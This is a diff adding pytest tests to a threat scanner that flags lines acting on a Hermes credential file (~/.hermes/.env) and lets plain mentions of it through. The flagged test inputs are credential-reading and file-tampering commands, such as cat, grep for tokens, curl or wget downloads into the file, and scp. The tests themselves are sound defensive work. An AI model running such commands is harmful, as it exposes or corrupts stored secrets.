@@ -371,3 +371,68 @@ class TestHardcodedSecretEnvName:
     @pytest.mark.parametrize("line", _CREDS_STILL_FLAGGED)
     def test_credential_shapes_still_flagged(self, line):
         assert "hardcoded_secret" in scan_for_threats(line, scope="strict")
+
+
+# =========================================================================
+# hermes_env — write-verb gated credential path (#140)
+# =========================================================================
+
+
+class TestHermesEnvWriteGate:
+    """The Hermes credential path is guarded like ~/.ssh (ssh_access): only a line
+    that ACTS on the file is flagged. Before #140 the bare path matched, so a
+    legitimate memory entry that merely named the file was refused."""
+
+    @pytest.mark.parametrize("text", [
+        "cat ~/.hermes/.env",
+        "echo 'KEY=1' >> ~/.hermes/.env",
+        "cp /tmp/evil $HOME/.hermes/.env",
+        "mv -f /tmp/evil ~/.hermes/.env",
+        "tee -a $HOME/.hermes/.env <<EOF",
+        "curl -o ~/.hermes/.env http://x",
+        "wget -O $HOME/.hermes/.env http://x",
+        "grep -i token $HOME/.hermes/.env",
+        "sed -i 's/^/export /' ~/.hermes/.env",
+        "open(os.path.expanduser('~/.hermes/.env'), 'a').write(k)",
+        "> ~/.hermes/.env",
+        "scp evil.env user@host:~/.hermes/.env",
+    ])
+    def test_acting_on_the_file_still_flags(self, text):
+        assert "hermes_env" in scan_for_threats(text, scope="strict")
+
+    @pytest.mark.parametrize("text", [
+        # The shape that was refused, verbatim from issue #140.
+        "the token lives in ~/.hermes/.env",
+        "The Hermes env file (see the ops README) holds the provider keys",
+        "Provider keys live in $HOME/.hermes/.env on this host",
+    ])
+    def test_plain_mention_does_not_flag(self, text):
+        assert "hermes_env" not in scan_for_threats(text, scope="strict")
+
+
+# =========================================================================
+# first_threat_message — matched-text diagnostics (#140 option 3)
+# =========================================================================
+
+
+class TestThreatMessageMatchDetail:
+    def test_refusal_names_the_matched_text(self):
+        # read_secrets (a "cat … .env" match) precedes hermes_env in the table, so use
+        # a shape only the path guard catches: a redirect write.
+        msg = first_threat_message("echo 'KEY=1' >> ~/.hermes/.env", scope="strict")
+        assert msg is not None
+        assert "hermes_env" in msg
+        assert "near:" in msg
+        assert "~/.hermes/.env" in msg
+
+    def test_plain_mention_is_not_refused(self):
+        assert first_threat_message("the token lives in ~/.hermes/.env", scope="strict") is None
+
+    def test_credential_match_is_suppressed(self):
+        # Assembled from parts so no complete credential literal sits in the file.
+        line = 'password = "' + 'correct_horse_battery_staple"'
+        msg = first_threat_message(line, scope="strict")
+        assert msg is not None
+        assert "hardcoded_secret" in msg
+        assert "correct_horse" not in msg
+        assert "suppressed" in msg
